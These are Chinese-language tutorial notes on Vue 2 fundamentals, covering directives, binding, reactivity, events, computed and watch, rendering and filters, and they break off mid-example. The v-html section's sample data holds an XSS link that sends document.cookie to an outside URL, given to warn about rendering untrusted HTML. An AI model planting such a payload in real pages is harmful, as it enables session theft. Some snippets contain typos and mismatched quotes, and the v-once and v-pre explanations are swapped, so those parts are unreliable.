# Vue基础

[[toc]]

## helloWorld

- 想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象
- root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法
- root容器里的代码被称为【Vue模板】
- Vue实例和容器是一一对应的
- 真实开发中只有一个Vue实例，并且会配合着组件一起使用
- {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性
- 一旦data中的数据发生改变，那么页面中用到该数据的地方会自动更新

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>初始Vue</title>
    <!-- 引入vue -->
    <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
  </head>
  <body>
    <!-- 准备好一个容器 -->
    <div id="root">
      <!-- 插值语法 -->
      {{name}}
    </div>

    <script type="text/javascript">
      Vue.config.productionTip = false; // 阻止vue在启动时生成生成提示

      // 引入vue后，在原型上就会有Vue构造函数，通过new 即可创建vue实例
      // 创建Vue实例
      const vm = new Vue({
        // el:document.getElementById("root") // 也可以自己获取到元素，但是通常不这么用，麻烦。
        el:"#root", // el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器的字符串
        data:{ // data中用于存储数据，数据供el所指定的容器去使用。
          name:'xxxx'
        }
      })
    </script>

  </body>
</html>
```

## js表达式 vs js代码

js表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方
- 变量a
- 变量计算 a + b
- 函数调用deml(1)
- 三元表达式 x === y ?'a':'b'

js代码（语句）
- if(){}
- for(){}

## 模板语法

### 插值语法
- 功能：用于解析标签体内容。
- 写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。  
```html
<div>{{}}</div>
```

### 指令语法
- 功能：用于解析标签（包括标签属性，标签体内容，绑定事件......）
- 备注：vue中有很多指定，v-xxx
```html
<body>
    <!-- 准备好一个容器 -->
    <div id="root">
     <!-- <a href="http://www.baidu.com">点我去百度</a> -->
    <!-- <a v-bind:href="url">点我去百度</a> -->
    <a :href="url">点我去百度</a>
    <a :href="url.toUpperCase()">点我去百度</a>
    </div>

    <script type="text/javascript">
      const vm = new Vue({
        el:"#root", // el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器的字符串
        data:{ // data中用于存储数据，数据供el所指定的容器去使用。
          name:'xxxx',
          url:'http://www.baidu.com'
        }
      })
    </script>

  </body>
```

#### v-text
- 作用：向其所在的节点中渲染文本内容。
- 与插值语法的区别：`v-text`会替换掉节点中的内容，`{{x}}`不会
```html
<body>
    <div id="root">
        <div>{{name}}</div>
        <div v-text="name"></div>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        el:"#root", 
        data:{ 
          name:'xxxx',
        }
      })
    </script>

  </body>
```

#### v-html
- 作用：向指定节点中渲染包含html结构的内容。
- 与插值语法的区别
  - v-html会替换掉节点中的内容，`{{x}}`不会。
  - v-html可以识别html结构。
严重注意：v-html有安全性问题！！！
  - 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
  - 一定要在可信的内容上使用v-html,永不在用户提交的内容上。
```html
<body>
    <div id="root">
        <div v-text="str"></div>

        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script type="text/javascript">
      // document.cookie 获取所有cookie
      // 定义cookie的时候，敏感的数据一定要加 httpOnly，这样document.cookie就获取不到了
      
      const vm = new Vue({
        el:"#root", 
        data:{ 
          str:'<h3>你好</h3>',
          // str2:'<a href=javascript:alert(1)>这里有你想要的资源，快来！</a>'
          str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这里有你想要的资源，快来！</a>'
        }
      })
    </script>

  </body>
```

#### v-cloak（没有值）
- 本质是一个特殊属性，`Vue`实例创建完毕并接管容器后，会删掉`v-cloak`属性。
- 使用`CSS`配合`v-cloak`可以解决网速慢时页面展示出`{{xxx}}`等的问题
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8"/>
    <title>v-cloak指令</title>
    <style>
      /* 选中所有标签里有v-cloak属性的元素 */
      [v-cloak]{
        display:none;
      }
    </style>
  </head>
  <body>
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
         <!-- 这个资源加载的比较慢 -->
        <script type="text/javascript" src="http://"></script>
    </div>
    <script type="text/javascript">
      // document.cookie 获取所有cookie
      // 定义cookie的时候，敏感的数据一定要加 httpOnly，这样document.cookie就获取不到了
      
      const vm = new Vue({
        el:"#root", 
        data:{ 
          name:'jiajia'
        }
      })
    </script>
   
  </body>
</html>
```


#### v-once
- 跳过其所在节点的编译过程。
- 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8"/>
    <title>v-once指令</title>
  </head>
  <body>
    <div id="root">
        <h2 v-pre>Vue其实很简单</h2>

        <h2>当前的n值是：{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        el:"#root", 
        data:{ 
          n:1
        }
      })
    </script>
   
  </body>
</html>
```



#### v-pre
- v-once所在节点在初次动态渲染后，就视为静态内容了。
- 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8"/>
    <title>v-once指令</title>
  </head>
  <body>
    <div id="root">
        <h2 v-once>初始化的n值是：{{n}}</h2>
        
        <h2>当前的n值是：{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        el:"#root", 
        data:{ 
          n:1
        }
      })
    </script>
   
  </body>
</html>
```





## 数据绑定

Vue中有两种数据绑定的方式：
- 单项数据绑定（v-bind）：数据只能从data流向页面。
- 双向数据绑定（v-model）：数据不仅能从data流向页面，还可以从页面流向data

> 1.双向绑定一般都应用在表单类元素上（如：input、select等）
> 2.v-model:value 可以简写为v-model，因为v-model默认收集的就是value值。
```html
<body>
    <div id="root">
      <!-- 普通写法 -->
      单项数据绑定：<input type="text" v-bind:value="name"/><br/>
      双项数据绑定：<input type="text" v-model:value="name"/><br/>


      <!-- 简写 -->
      单项数据绑定：<input type="text" :value="name"/><br/>
      双项数据绑定：<input type="text" v-model="name"/><br/>

      <!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
      <!-- <h2 v-model:x="name">测试</h2> -->
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        el:"#root", 
        data:{ 
          name:'xxxx',
        }
      })
    </script>

  </body>
```

## el与data的两种写法


### el的两种写法
- `el`指定容器，new Vue的时候就配置el属性，写好指定容器。
```html
<body>
    <div id="root">
 
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        el:"#root", 
        data:{ 
          name:'xxxx',
          url:'http://www.baidu.com'
        }
      })
    </script>

  </body>
```

- `$mount`指定容器，先创建Vue实例，随后再通过vm.$mount指定el的值
```html
<body>
    <div id="root">
 
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxxx',
          url:'http://www.baidu.com'
        }
      })
      
      vm.$mount('#root');
    </script>

  </body>
```

### data的两种写法
- 对象式
```js
new Vue({
  el:"#root",
  data:{
    name:'xixi'
  }
})
```

- 函数式
  - 写成普通函数，其中的this是Vue实例对象
  - 写成箭头函数，其中的this是Window对象（箭头函数没有this就会往上找，所以就找到了Window）
  - Vue中此处必须写成普通函数

```js
new Vue({
  el:"#root",
  data:function(){
    // 此处的this是Vue实例对象
    return{
      name:'xixi'
    }
  }
})
```

```js
// 普通函数在对象中可以省略 :function 简写如下
new Vue({
  el:"#root",
  data(){
    // 此处的this是Vue实例对象
    return{
      name:'xixi'
    }
  }
})
```


> 组件式开发中data必须用函数式，否则会报错。

> 由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。


## Vue中的MVVM模型

- M:模型（Model）：对应data中的数据
- V:视图（View）：模板
- VM:视图模型（ViewModel）：Vue实例对象

![image](/imgs/vue/MVVM1.png)


![image](/imgs/vue/MVVM2.png)

> 补充：
> data中的所有属性，最后都出现在了vm身上。
> vm身上所有的属性 及 Vue原型上的所有属性，在vue模板中都可以直接使用。

## 数据代理 

### 定义
通过一个对象代理对另一个对象中属性的操作（读/写）

```js
// obj2代理obj中属性x的操作
let obj = {x:100}
let obj2 = {y:200}

Object.defineproperty(obj2,'x',{
  get(){
    return obj.x
  },
  set(value){
    obj.x = value
  }
})
```


### Object.defineproperty

功能：给对象添加属性。
参数：
- 指定对象
- 添加属性的名称
- 配置项


基础配置：
```js
let person = {
  name:'张三',
  sex:'男'
}

Object.defineProperty(person,'age',{
  value:18,
  enumerable:true, // 控制属性是否可枚举，默认为false，不可枚举
  writable:true, // 控制属性是否可以被修改，默认为false，不可修改
  confugurable:true // 控制属性是否可以被删除，默认为false，不可删除
})

 // {name:'张三',sex:'男'}
  // {name:'张三',sex:'男',age:18}
```

![image](/imgs/vue/defineProterty1.png)


特征：
- 通过Object.defineProperty添加的属性，可以控制该属性是否可枚举（遍历），是否可修改，是否可删除等。


高级配置：

```js
let number = 18;
let person = {
  name:'张三',
  sex:'男'
}

// 给person增加一个age属性，且值读取的是number，且互相联动。

Object.defineProperty(person,'age',{
  // 当有人读取person的age属性时，get函数（getter）会被调用，且返回值就是age的值
  // get:function(){
  //   // return 'hello'
  //   return number;
  // }
  // 简写
  get(){
    consloe.log('有人读取了age属性')
    // return 'hello'
    return number;
  }


  // 当有人修改person的age属性时，get函数（getter）会被调用，且会收到修改的具体的值
  set(value){
    
    number = value;
  }
})
```

### Vue中的数据代理

定义：通过vm对象来代理data对象中属性的操作（读/写）

好处：更加方便操作data中的数据。

基本原理：通过`Object.defineProperty`把data对象中所有属性都添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中的属性。


![image](/imgs/vue/data1.png)


数据代理前
```html
<body>
    <div id="root">
      <p>{{_data.name}}</p>
      <p>{{_data.url}}</p>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxxx',
          url:'http://www.baidu.com'
        }
      })
    </script>
  </body>
```

数据代理后
```html
<body>
    <div id="root">
      <p>{{name}}</p>
      <p>{{url}}</p>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxxx',
          url:'http://www.baidu.com'
        }
      })
    </script>
  </body>
```

补充：
_data 中的数据不完全等价data,在data基础上做了数据劫持，监听数据的变化，以响应页面。

## 事件

### 事件处理

基本使用：
- 使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名。
- 事件的回调需要配置在methods对象中，最终会在vm上。
- methods中配置的函数，不要用箭头函数！否则this就不是vm了，而是window
- methods中配置的函数，都是被Vue所管理的函数，this指向是vm 或组件实例对象。
- @click="demo" 和 @click="demo($event)" 效果一致。


```html
<body>
    <div id="root">
       <button @click="info1">点我信息1</button>
     <button @click="info2(22,$event)">点我信息</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxxx',
          url:'http://www.baidu.com'
        },
        methods:{
          info1(event){
            
          },
          info2(num,event){

          }
        }
      })
    </script>
  </body>
```

### 事件修饰符

- `prevent` 阻止默认事件行为,等价于`e.preventDefault()`
- `stop` 阻止事件冒泡,等价于`e.stopPropagation()`
- `once` 事件只触发一次
- `capture` 使用事件的捕获模式
- `self` 只有event.target 是当前操作的元素时才触发事件
- `passive` 事件的默认行为立即执行，无需等待事件回调执行完毕。
```html
<body>
    <div id="root">
      <!-- prevent -->
      <a href="http:www.baidu.com" @click.prevent="showInfo"></a>

      <!-- stop -->
      <div  @click="showInfo">
        <button @click.stop="showInfo">点我提示信息</button>
      </div>

      <!-- capture -->
      <div class="box1" @click.capture="showMsg(1)">
        div1
         <div class="box2" @click="showMsg(2)">
           div2
          </div>
      </div>

      <!-- self -->
      <div  @click.self="showInfo">
        <button @click="showInfo">点我提示信息</button>
      </div>

      <!-- passive -->
      <!-- scroll 滚动条的滚动触发 -->
      <!-- wheel 鼠标的滚轮滚动触发 -->
      <ul class="list" @wheel.passive="demo">
        <li>1</li>
        <li>2</li>
        <li>3</li>
        <li>4</li>
      </ul>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxxx',
          url:'http://www.baidu.com'
        },
        methods:{
          showInfo(event){
            // event.preventDefault();
          },
          showMsg(msg){
             // 1  2
          },
          demo(){
            // 滚动条滚动触发，先执行demo回调函数，执行完毕后滚动条才会向下移动一定的距离。

            // 若此处逻辑及数据量较大，就会比较卡
          }
        }
      })
    </script>
  </body>
```

> 正常触发元素的时候，都是先捕获后冒泡，默认情况下事件冒泡阶段才是处理事件的。


###  键盘事件

1.Vue中常用的按键别名
- `enter` 回车
- `delete` 删除（捕获"删除"和"退格"键）
- `esc` 退出
- `space` 空格
- `tab` 换行（特殊，必须配合keydown使用）
- `up` 上
- `down` 下
- `left` 左
- `right` 右

2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）

3.系统修饰键（用法特殊）：ctrl、alt、shift、meta（window图标）
- 配合`keyup`使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才会触发。
- 配合`keydown`使用：正常触发事件。


4.也可以使用keyCode去指定具体的按钮（不推荐）
- mdn官网中有说明，该特性已经从Web标准中删除。


5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名。


```html
<body>
    <div id="root">
        <!-- keydown 按下触发 -->
        <!-- keyup   抬起触发 -->

       <!-- <input type="text" placeholder="按下回车提示输入" @keyup="showInfo"/> -->
          <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo"/>

            <input type="text" placeholder="按下回车提示输入" @keyup.caps-lock="showInfo"/>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxxx',
          url:'http://www.baidu.com'
        },
        methods:{
          showInfo(e){
            // 回车编码 13
            // 按键编码 e.keyCode
            // 按键名称 e.key
            // if(e.keyCode !== 13) return
            
            
          },
        }
      })
    </script>
  </body>
```

### 小技巧

- 修饰符可以连续写`@click.stop.prevent="showInfo"`
- 可以指定Ctrl+y触发：`@keyup.ctrl.y="showInfo"`


## 属性

### 计算属性


- 定义：要用的属性不存在，要通过已有属性计算得来。
- 原理：底层借助了Object.defineProperty方法提供的getter和setter。
- get函数什么时候执行？
  - 初次读取时会执行一次
  - 当依赖的数据发生改变时会被再次调用。
- 优势：与methods实现相比，内部有缓存机制
- 其他
  - 计算属性最终会出现在vm上，直接读取使用即可。
  - 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。


```html
<body>
    <div id="root">
       姓:<input type="text" v-model="firstName"> <br/>
       名:<input type="text" v-model="lastName">  <br/>
       全名：<span>{{fullName}}</span>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          firstName:'嘻',
          lastName:'哈'
        },
        computed:{
          fullName:{
            // get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值

            // get什么时候调用？1.初次读取fullName时 2.所依赖数据发生变化时
            get(){
              // 此处的this 指向 vm
              
              return this.firstName+'-'+this.lastName
            },

            // set什么时候调用？当fullName被修改时
            set(value){
              consloe.log('set',value)
              // 张-三
              const arr=value.split('-');
              this.firstName = arr[0]
              this.lastName = arr[1]
            }
          }
        }
      })
    </script>
  </body>
```

- 简写
  - 当计算属性只读取，不修改，可以使用简写方法

```html
<body>
    <div id="root">
       姓:<input type="text" v-model="firstName"> <br/>
       名:<input type="text" v-model="lastName">  <br/>
       全名：<span>{{fullName}}</span>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          firstName:'嘻',
          lastName:'哈'
        },
        computed:{
          // fullName:function(){
          //   return this.firstName+this.lastName
          // }

           fullName(){
            return this.firstName+'-'+this.lastName
          }
        }
      })
    </script>
  </body>
```

### 监视属性

- 当被监视的属性变化时，回调函数自动调用，进行相关操作。
- 监视的属性必须存在，才能进行监视。
- 监视属性的两种写法
  - `new Vue`时传入`watch`配置
  - 通过`vm.$watch`监视


#### watch写法1
```html
<body>
    <div id="root">
       <h2>今天天气很{{info}}</h2>
       <button @click="isHot = !isHot">切换天气</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          isHot:true
        },
        computed:{
          info(){
            return this.isHot?'炎热':'凉爽'
          }
        },
        watch:{
          isHot:{
            immediate:true,//立即执行
            // handler什么时候调用？当isHot发生改变时调用。
            handler(newValue,oldValue){
              //
            }
          }
        }
      })
    </script>
  </body>
```

#### watch写法2
```html
<body>
    <div id="root">
       <h2>今天天气很{{info}}</h2>
       <button @click="isHot = !isHot">切换天气</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          isHot:true
        },
        computed:{
          info(){
            return this.isHot?'炎热':'凉爽'
          }
        },
      })

      vm.$watch('isHot',{
          immediate:true,//立即执行
            // handler什么时候调用？当isHot发生改变时调用。
          handler(newValue,oldValue){
              //
          }    
      })
    </script>
  </body>
```


#### 深度监视

- Vue中的watch默认不监测对象内部值的改变（一层）
- 配置`deep:true`可以监测对象内部值改变（多层）
- Vue自身可以监测对象内部值的改变，但Vue提供的`watch`默认不可以。
- 使用watch的时候根据数据的具体结构，决定是否采用深度监测。

```html
<body>
    <div id="root">
       <h2>今天天气很{{info}}</h2>
       <button @click="isHot = !isHot">切换天气</button>
       <hr/>

       <h3>a的值是:{{numbers.a}}</h3>
       <button @click="numbers.a++">点我让a+1</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          isHot:true,
          numbers:{
            a:1,
            b:1
          }
        },
        computed:{
          info(){
            return this.isHot?'炎热':'凉爽'
          }
        },
        watch:{
          // 监视多级结构中某个属性的变化
          'numbers.a':{
            immediate:true,
            handler(newValue,oldValue){
              //
            }
          },
          // 监视多级结构中所有属性的变化
          numbers:{
            deep:true, //深度监视
            handler(newValue,oldValue){
              //
            }
          }
        }
      })


    </script>
  </body>
```

#### 简写

```html
<body>
    <div id="root">
       <h2>今天天气很{{info}}</h2>
       <button @click="isHot = !isHot">切换天气</button>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          isHot:true,
          numbers:{
            a:1,
            b:1
          }
        },
        computed:{
          info(){
            return this.isHot?'炎热':'凉爽'
          }
        },
        watch:{
          // 正常写法
          // isHot:{
          //   // immediate:true,
          //   // deep:true, 
          //   handler(newValue,oldValue){
          //     //
          //   }
          // }

          // 简写
          isHot(newValue,oldValue){

          }
        }
      })


      // 正常写法
      // vm.$watch('isHot',{
      //     immediate:true,//立即执行
      //     deep:true, 
      //     handler(newValue,oldValue){
      //         //
      //     }    
      // })


      // 简写
      vm.$watch('isHot',function(newValue,oldValue){

      })
    </script>
  </body>
```


### computed VS watch

- computed能完成的功能,watch都可以完成。
- watch能完成的功能,computed不一定能完成，例如：watch可以进行异步操作。


两个重要的原则
- 所被`Vue`管理的函数，最好写成普通函数，这样this分指向才是vm 或 组件实例对象。
- 所有不被`Vue`管理的函数(定时器的回调函数、ajax的回调函数、Promise的回调函数 等)，最好写成箭头函数，这样this的指向才是vm 或 组件实例对象。（因为箭头函数本身没有this对象，所以需要向上一层找，故找到vm）



## class与style样式绑定

### class样式绑定

- 字符串写法，适用于样式的类名不确定，需要动态指定。
- 数组写法，适用于要绑定的样式个数不确定，名字也不确定。
- 对象写法，适用于要绑定的样式个数确定，名字也确定，但要动态决定用不用。
```html
<body>
    <div id="root">
      <div class="basic" :class="mood" 
      id="demo" @click="changeMood">{{name}}</div>


      <div class="basic" :class="arr"></div>

      <div class="basic" :class="classObj"></div>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxx',
          mood:'normal',
          arr:['class1','class2','class3'],
          classObj:{
            class1:false,
            class2:true
          }
        },
        methods:{
          changeMood(){
            // document.getElementById('demo').className = 'basic happy'

            // this.mood = 'happy'

            const arr =['happy','sad','normal'];
            const index = Math.floor(Math.random()*3) //随机取心情 0 1 2 
            this.mood = arr[index]
          }
        }
      })
    </script>
  </body>
```


### style样式绑定

- 对象写法
- 数组写法(不常用)
```html
<body>
    <div id="root">
      <div class="basic" :class="mood" 
      id="demo" @click="changeMood">{{name}}</div>

      <div class="basic" style="font-size:30px"></div>

      <div class="basic" :style="{fontSize:fSize+'px'}"></div>

      <div class="basic" :style="styleObj"></div>

      <div class="basic" :style="styleArr"></div>
    </div>
    <script type="text/javascript">
      const vm = new Vue({
        data:{ 
          name:'xxx',
          fSize:40,
          styleObj:{
            fontSize:'40px',
            color:'red'
          },
          styleObj2:{
            backgroundColor:'orange'
          },
          styleArr:[
            {
            fontSize:'40px',
            color:'red'
            },
            {
            backgroundColor:'orange'
            },
          ]
        },
        methods:{
          changeMood(){
            const arr =['happy','sad','normal'];
            const index = Math.floor(Math.random()*3) //随机取心情 0 1 2 
            this.mood = arr[index]
          }
        }
      })
    </script>
  </body>
```


## 渲染

### 条件渲染

#### v-if

- 写法：
  - v-if="表达式"
  - v-else-if="表达式"
  - v-else="表达式"
- 适用于：切换频率较低的场景。
- 特点：不展示的DOM元素直接被移除。
- 注意：v-if可以和v-else-if、v-else一起使用，但要求结构不能被打断。


#### v-show

- 写法：v-show="表达式"
- 适用于：切换频率较高的场景。
- 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉。


> 备注：使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到。

template与v-if的配合使用，不能和v-show配合使用
```html
<template v-if="n===1">
  <h2></h2>
  <h2></h2>
  <h2></h2>
</template>
```



### 列表渲染

#### v-for

- 遍历数组`v-for="(p,index) in persons" `
- 遍历对象`v-for="(value,k) of obj"`
- 遍历字符串`v-for="(item,index) of str"`
- 遍历指定次数`v-for="(number,index) of 5"`

> v-for有in 和 of两种写法

```html
<ul>
  <li v-for="(p,index) in persons" :key="p.id">
    {{p.name}}
  </li>
</ul>
```

#### key作用与原理

![image](/imgs/vue/key1.png)

![image](/imgs/vue/key2.png)

1.虚拟dom中key的作用

key是虚拟dom对象的标识，当数据发生变化时，Vue会根据【新数据】生成新的虚拟dom，随后Vue进行【新虚拟dom】与旧【虚拟dom】的差异比较，比较规则如下：

2.对比规则
- 旧虚拟dom找到了与新虚拟dom相同的key
  - 若虚拟DOM中内容没变，直接使用之前的真实dom
  - 若虚拟dom中内容变了，则生成新的真实dom,随后替换掉页面中之前的真实dom
- 旧虚拟dom未找到与新虚拟dom相同的key
  - 创建新的真实dom,随后渲染到页面

3.用index作为key可能引发的问题
- 若对数据进行：逆序添加、逆序删除等破坏顺序操作，会产生没有必要的真实dom更新=>页面效果没问题，但是效率低。
- 如果结构中还包含输入类的dom:会产生错误dom更新=>界面有问题。

4.开发中如何选择key
- 最好使用每条数据唯一标识作为key，比如id、身份证号等唯一值。
- 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，只用index作为key是没有问题的。



### 监测数据改变原理

- vue会监视data中所有层次的数据。

#### Vue更新时的一个问题
```html
<body>
  <template>
    <h2>学生姓名：{{student.name}}</h2>
    <h2>学生真实年龄：{{student.age.eAge}}</h2>
  </template>
  <script type="text/javascript">
    new Vue({
     el:"#root',
     data:{
      persons:[
        {id:'001',name:'xxx1',age:18}
      ] 
    },
    methods:{
      update(){
      // 方式1-生效
      this.persons[0].id = '002';
      this.persons[0].age = 18;
      this.persons[0].sex = '男';

      // 方式2-不生效
      // 此方式改变数据，数据是变化了，但是Vue监测不到，页面不会变化
      this.persons[0] = {id:'002',name:'xxx2',age:18}}


      // 方式3 - 采用数组方法 生效
      this.persons.splice(0,1,{id:'002',name:'xxx2',age:18})
    }
    })
  </script>
  </body>
```



#### Vue如何监听对象数据的改变

- 通过setter实现监视，且要在`new Vue`时就传入要监测的数据
  - 对象中后追加的属性，Vue默认不做响应式原理
  - 如需给后添加的属性做响应式，请使用如下API
    - `Vue.set(target,propertyName/index,value)` 或
    - `vm.$set(target,propertyName/index,value)`

```html
<body>
   
    <script type="text/javascript">
      let data ={
        name:'xxx',
        age:18
      }

      // Vue底层写了一个构造函数Observer
      const obs = new Observer(data);// 创建一个监视的实例对象，用于监视data中属性的变化

      // 准备一个vm实例对象
      let vm = {}
      vm._data = data = obs;

      function Observer(obj){
        // 1.汇总对象中所有的属性形成一个数组
        const keys = Object.keys(obj)
        // 遍历
        keys.forEach((k)=>{
          // 技巧
          // 此处this指的是 obs（即Obesrver的实例对象）
          Object.defineProperty(this,k,{
            get(){
              return obj[k]
            },
            set(val){
              // k 被改了，我要去解析模板，生成虚拟dom,进行虚拟对比，渲染页面。。。
              obj[k] = val
            }
          })
        })
      }
    </script>
  </body>
```




#### Vue如何监听数组数据的改变

通过包装Array.prototype上的常用数组方法,本质上就做了两件事：
- 正常调用Array.prototype上的数组方法，对数组进行更新
- 重新解析模板，生成虚拟dom，进而更新页面


在Vue中修改数组中某个元素一定要用如下方法
- 使用这些API：push()、pop()、unshift()、shift()、splice()、sort()、reverse()
- Vue.set() 或 vm.$set()

> 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！！


#### Vue.set()方法
```html
<body>
  <template>
    <h2>学生姓名：{{student.name}}</h2>
    <h2>学生性别：{{student.sex}}</h2>
    <h2>学生真实年龄：{{student.age.eAge}}</h2>
  </template>
  <script type="text/javascript">
    new Vue({
      el:"#root',
      data:{
        student:{
          name:'lili',
          age:{
            rAge:40,
            sAge:29
          }
        }
      },
    })
  </script>
  </body>
```

- `this.student.sex = '男'` 直接写，后添加的属性没有响应式功能，不好用
- `Vue.set()` 通过调用Vue.set,可实现后添加的属性具备响应式功能
- `vm.$set()` 通过调用实例vm上的set,可实现后添加的属性具备响应式功能


数组也可以使用`Vue.set`
```js
hobbys:['吃吃','喝喝']

Vue.set(vm.hobbys,1,'打台球')
```






##  收集表单数据

- 若`<input type="text"/>`,则v-model收集的是value值，用户输入的就是value值。
- 若`<input type="radio"/>`,则v-model收集的是value值，且要给标签配置value值。
- 若`<input type="checkbox"/>`
  - 没有配置input的value属性，那么收集的就是checked(勾选 或 未勾选  布尔值)
  - 配置input的value属性
    - v-model的初始值是非数组，那么收集的就是checked(勾选 或 未勾选  布尔值)
    - v-model的初始值是数组，那么收集的就是value组成的数组

备注：v-model的三个修饰符
- lazy：失去焦点再收集数据
- number:输入字符串转为有效的数字
- trim:输入首尾空格过滤

```html
<body>
  <template>
    <form @submit.prevent="demo">
      <!-- trim 去掉前后空格 -->
      <label for="demo">账号：</label> <input type="text" id="demo" v-model.trim="userInfo.account"/>
      <br/>
      <label for="password">密码：</label> <input type="password" id="password" v-model="userInfo.password"/>
      <br/>
      <label for="age">年龄：</label> <input type="number" id="age" v-model.number="userInfo.age"/>

      <br/>
      <label>性别：</label> 
      男<input type="radio" id="sex1" name="sexGroup" v-model="sex" value="userInfo.male"/>  
      女<input type="radio" id="sex2" name="sexGroup" v-model="sex" value="userInfo.female"/>
      <br/>

      <label>爱好：</label>
      学习<input type="checkbox" id="hobby1" v-model="hobby" value="userInfo.study"/>
      吃饭<input type="checkbox" id="hobby2" v-model="hobby" value="userInfo.eat"/>
      打游戏<input type="checkbox" id="hobby3" v-model="hobby" value="userInfo.game"/>

      <br/>
      <label>所属校区：</label>
      <select v-model="userInfo.city">
        <option value="">请选择校区</option>
        <option value="beijing">北京校区</option>
        <option value="dalian">大连校区</option>
        <option value="shanghai">上海校区</option>
      </select>

      <br/>
      <label>其他信息：</label>
      <!-- lazy 失去焦点才收集 -->
      <textarea v-model.lazy="userInfo.other"></textarea>

      <br/>
      <input type="checkbox" v-model="userInfo.agree"/>阅读并接受<a href="www.xxx">《用户协议》</a>

      <br/>
      <button>提交</button>
    </form>
  </template>
  <script type="text/javascript">
    new Vue({
      el:"#root',
      data:{
        userInfo:{
          account:'',
          password:'',
          sex:'femal',
          hobby:[],
          city:'',
          other:'',
          agree:''
        }
      },
      methods:{
        demo(){
          // 表单提交后跳转页面时默认行为
          console.log('输出表单数据')
          console.log(JSON.stringify(this.userInfo))
        }
      }
    })
  </script>
  </body>
```




## 过滤器

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单的逻辑处理）
- 语法
  - 注册过滤器：Vue.filter(name,callback) 或 new Vue({filters:{}})
  - 使用过滤器：{{xxx | 过滤器名}} 或 v-bind:属性="xxx | 过滤器名"
- 备注
  - 过滤器也可以接收额外参数、多个过滤器也可以串联
  - 并没有改变原本的数据，是产生新的对应数据



```html

<!-- 引用了dayjs库 -->
<body>
  <template>
    <div id="root">
      <h2>显示格式化后的时间</h2>

      <!-- 计算属性实现 -->
      <h3>现在是{{fmtTime}}</h3>

       <!-- methods实现 -->
      <h3>现在是{{getFmtTime()}}</h3>

      <!-- 过滤器实现 -->
      <!-- 工作流程：读取time，然后将time作为参数传给定义的过滤器方法，返回值替换time的位置 -->
      <h3>现在是{{time | timeFormater}}</h3>

      <!-- 过虑器实现（传参） -->
      <h3>现在是{{time | timeFormater('YYYY年MM月')}}</h3>

       <!-- 过虑器实现（串联） -->
      <h3>现在是{{time | timeFormater('YYYY年MM月') | mySlice}}</h3>


      <!-- 不仅用在插值语法中，v-bind也可 -->
      <h3 :x="msg | mySlice"></h3>
    </div>
  </template>
  <script type="text/javascript">
    // 全局过滤器
    Vue.filter('mySlice',function(value){
       // 截取前4位
        return value.slice(0,4)
    })
    new Vue({
      el:"#root',
      data:{
       time:1621561377603, // 时间戳
       msg:'xxx,ccc'
      },
      computed:{
        fmtTime(){
          return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
        }
      },
      methods:{
        getFmtTime(){
          return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
        }
      },
      // 局部过滤器
      filters:{
        timeFormater(value,str='YYYY-MM-DD HH:mm:ss'){
           return dayjs(value).format(str)
        },
        mySlice(value){
          // 截取前4位
